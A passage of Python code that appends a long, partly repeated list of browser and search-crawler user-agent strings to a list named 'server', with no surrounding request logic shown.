    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    server.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
    server.append('Opera/9.20 (Windows NT 6.0; U; en)')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
    server.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
    server.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
    server.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
    server.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
    server.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
    server.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    server.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    server.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    server.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    server.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    server.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    server.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    server.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    server.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    server.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    server.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    server.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    server.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    server.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    server.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    server.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    server.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    server.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    server.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    server.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    server.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    server.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    server.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    server.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    server.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    server.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    server.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    server.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    server.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    server.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    server.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
    server.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
    server.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
    server.append('Mozilla/4.0 (compatible; Arachmo)')
    server.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
    server.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    server.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    server.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
    server.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
    server.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
    server.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
    server.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
    server.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    server.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    server.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    server.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
    server.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
    server.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
    server.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
    server.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
    server.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
    server.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
    server.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
    server.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
    server.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
    server.append('SiteBar/3.3.8 (Bookmark server; http://sitebar.org/)')
    server.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    server.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    server.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
    server.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
    server.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
    server.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
    server.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
    server.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    server.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
